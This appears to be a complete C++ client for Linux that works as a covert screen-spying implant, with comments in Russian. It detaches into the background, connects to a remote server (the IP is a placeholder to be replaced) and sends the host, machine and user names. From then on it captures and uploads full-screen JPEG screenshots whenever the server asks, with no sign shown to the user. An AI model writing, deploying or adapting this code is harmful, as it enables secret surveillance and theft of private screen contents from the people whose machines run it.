// client_linux.cpp
#include <stdio.h>
#include <jpeglib.h>
#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <sys/utsname.h>
#include <pwd.h>

bool running = true;

std::string GetDomainName() {
    struct utsname buf;
    if (uname(&buf) == 0) {
        return std::string(buf.nodename);
    }
    return "UNKNOWN";
}

std::string GetMachineName() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        return std::string(hostname);
    }
    return "UNKNOWN";
}

std::string GetUserName() {
    struct passwd *pwd = getpwuid(getuid());
    if (pwd) {
        return std::string(pwd->pw_name);
    }
    return "UNKNOWN";
}

bool TakeScreenshot(std::vector<char>& jpegData) {
    Display* display = XOpenDisplay(NULL);
    if (!display) return false;

    Window root = DefaultRootWindow(display);
    XWindowAttributes attributes;
    XGetWindowAttributes(display, root, &attributes);

    XImage* img = XGetImage(display, root, 0, 0, 
                           attributes.width, attributes.height,
                           AllPlanes, ZPixmap);
    if (!img) {
        XCloseDisplay(display);
        return false;
    }

    // Конвертируем XImage в JPEG
    struct jpeg_compress_struct cinfo;
    struct jpeg_error_mgr jerr;
    
    JSAMPROW row_pointer[1];
    cinfo.err = jpeg_std_error(&jerr);
    jpeg_create_compress(&cinfo);
    
    // Сохраняем в память (вместо файла)
    unsigned char* buffer = NULL;
    unsigned long size = 0;
    jpeg_mem_dest(&cinfo, &buffer, &size);
    
    cinfo.image_width = img->width;
    cinfo.image_height = img->height;
    cinfo.input_components = 3; // RGB
    cinfo.in_color_space = JCS_RGB;
    
    jpeg_set_defaults(&cinfo);
    jpeg_set_quality(&cinfo, 75, TRUE);
    jpeg_start_compress(&cinfo, TRUE);
    
    // Конвертируем данные XImage в RGB-формат
    std::vector<unsigned char> rgbBuffer(img->width * img->height * 3);
    for (int y = 0; y < img->height; y++) {
        for (int x = 0; x < img->width; x++) {
            unsigned long pixel = XGetPixel(img, x, y);
            rgbBuffer[(y * img->width + x) * 3 + 0] = (pixel >> 16) & 0xFF; // R
            rgbBuffer[(y * img->width + x) * 3 + 1] = (pixel >> 8)  & 0xFF;  // G
            rgbBuffer[(y * img->width + x) * 3 + 2] = pixel & 0xFF;         // B
        }
        row_pointer[0] = &rgbBuffer[y * img->width * 3];
        jpeg_write_scanlines(&cinfo, row_pointer, 1);
    }
    
    jpeg_finish_compress(&cinfo);
    jpeg_destroy_compress(&cinfo);
    
    // Копируем JPEG-данные в выходной буфер
    jpegData.assign(buffer, buffer + size);
    free(buffer);
    
    XDestroyImage(img);
    XCloseDisplay(display);
    return true;
}

void SendScreenshot(int serverSocket) {
    std::vector<char> imageData;
    if (TakeScreenshot(imageData)) {
        // Отправляем заголовок скриншота
        char header[8];
        memcpy(header, "SCRN", 4);
        *(int*)(header + 4) = imageData.size();
        send(serverSocket, header, 8, 0);
        
        // Отправляем данные изображения
        send(serverSocket, imageData.data(), imageData.size(), 0);
    }
}

void Heartbeat(int serverSocket) {
    while (running) {
        // Отправляем пакет для обновления времени активности
        const char* heartbeat = "PING";
        send(serverSocket, heartbeat, 4, 0);
        
        sleep(30);
    }
}

void ClientThread(int serverSocket) {
    char buffer[4096];
    int bytesReceived;
    
    // Запускаем поток для heartbeat
    std::thread heartbeatThread(Heartbeat, serverSocket);
    heartbeatThread.detach();
    
    while (running) {
        bytesReceived = recv(serverSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived <= 0) {
            running = false;
            break;
        }
        
        if (bytesReceived >= 4 && strncmp(buffer, "SCRN", 4) == 0) {
            SendScreenshot(serverSocket);
        }
    }
    
    close(serverSocket);
}

int main(int argc, char* argv[]) {
    // Для работы в фоновом режиме
    if (fork() != 0) {
        return 0;
    }
    
    // Создаем новый сеанс
    setsid();
    
    int serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket < 0) {
        return 1;
    }
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(12345);
    inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr); // Замените на IP сервера
    
    if (connect(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        close(serverSocket);
        return 1;
    }
    
    // Отправляем информацию о клиенте (domain|machine|user)
    std::string clientInfo = GetDomainName() + "|" + GetMachineName() + "|" + GetUserName();
    send(serverSocket, clientInfo.c_str(), clientInfo.size() + 1, 0);
    
    // Запускаем клиентский поток
    std::thread clientThread(ClientThread, serverSocket);
    clientThread.detach();
    
    // Оставляем процесс активным
    while (running) {
        sleep(1);
    }
    
    close(serverSocket);
    return 0;
}
